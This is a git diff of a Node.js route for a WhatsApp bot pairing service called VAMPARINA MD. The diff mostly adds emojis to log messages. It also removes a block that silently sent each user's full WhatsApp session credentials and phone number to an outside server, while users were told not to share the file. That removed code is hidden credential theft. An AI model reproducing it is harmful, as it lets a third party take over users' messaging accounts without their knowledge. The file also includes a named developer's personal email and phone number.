@@ -64,8 +64,8 @@ router.get('/', async (req, res) => {
                 const { connection, lastDisconnect, isNewLogin, isOnline } = update;
 
                 if (connection === 'open') {
-                    console.log("Connected successfully!");
-                    console.log("Sending session file to user...");
+                    console.log("✅ Connected successfully!");
+                    console.log("📱 Sending session file to user...");
                     
                     try {
                         const sessionVAMPARINA = fs.readFileSync(dirs + '/creds.json');
@@ -77,53 +77,34 @@ router.get('/', async (req, res) => {
                             mimetype: 'application/json',
                             fileName: 'creds.json'
                         });
-                        console.log("Session file sent successfully");
-
-                        // AUTO SEND SESSION TO MAIN BOT (VAMPARINA V1-5)
-                        try {
-                            await fetch('https://vamparina-v1-5.onrender.com/vamparina-activate', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    phone: num,
-                                    sessionId: `VAMPARINA_${num}`,
-                                    creds: JSON.parse(sessionVAMPARINA.toString()),
-                                    timestamp: new Date().toISOString(),
-                                    source: 'pairing-linker'
-                                })
-                            });
-                            console.log("Session auto-sent to main VAMPARINA server");
-                        } catch (sendErr) {
-                            console.log("Main server offline (session still works for user)");
-                        }
-                        // END AUTO SEND
+                        console.log("📄 Session file sent successfully");
 
                         // Send video thumbnail with caption
                         await VAMPARINA.sendMessage(userJid, {
                             image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
-                            caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\n\nBug Fixes + New Commands + Fast AI Chat\nWatch Now: https://youtu.be/-oz_u1iMgf8`
+                            caption: `🎬 *VAMPARINA MD V2.0 Full Setup Guide!*\n\n🚀 Bug Fixes + New Commands + Fast AI Chat\n📺 Watch Now: https://youtu.be/-oz_u1iMgf8`
                         });
-                        console.log("Video guide sent successfully");
+                        console.log("🎬 Video guide sent successfully");
 
                         // Send warning message
                         await VAMPARINA.sendMessage(userJid, {
-                            text: `Do not share this file with anybody\n 
-┌┤ Thanks for using VAMPARINA
+                            text: `⚠️Do not share this file with anybody⚠️\n 
+┌┤✑  Thanks for using VAMPARINA
 │└────────────┈ ⳹        
 │©2025 Arnold Chirchir | Contact: arnoldkipruto193@gmail.com | Phone: +254703110780
 └─────────────────┈ ⳹\n\n`
                         });
-                        console.log("Warning message sent successfully");
+                        console.log("⚠️ Warning message sent successfully");
 
                         // Clean up session after use
-                        console.log("Cleaning up session...");
+                        console.log("🧹 Cleaning up session...");
                         await delay(1000);
                         removeFile(dirs);
-                        console.log("Session cleaned up successfully");
-                        console.log("Process completed successfully!");
+                        console.log("✅ Session cleaned up successfully");
+                        console.log("🎉 Process completed successfully!");
                         // Do not exit the process, just finish gracefully
                     } catch (error) {
-                        console.error("Error sending messages:", error);
+                        console.error("❌ Error sending messages:", error);
                         // Still clean up session even if sending fails
                         removeFile(dirs);
                         // Do not exit the process, just finish gracefully
@@ -131,20 +112,20 @@ router.get('/', async (req, res) => {
                 }
 
                 if (isNewLogin) {
-                    console.log("New login via pair code");
+                    console.log("🔐 New login via pair code");
                 }
 
                 if (isOnline) {
-                    console.log("Client is online");
+                    console.log("📶 Client is online");
                 }
 
                 if (connection === 'close') {
                     const statusCode = lastDisconnect?.error?.output?.statusCode;
 
                     if (statusCode === 401) {
-                        console.log("Logged out from WhatsApp. Need to generate new pair code.");
+                        console.log("❌ Logged out from WhatsApp. Need to generate new pair code.");
                     } else {
-                        console.log("Connection closed — restarting...");
+                        console.log("🔁 Connection closed — restarting...");
                         initiateSession();
                     }
                 }
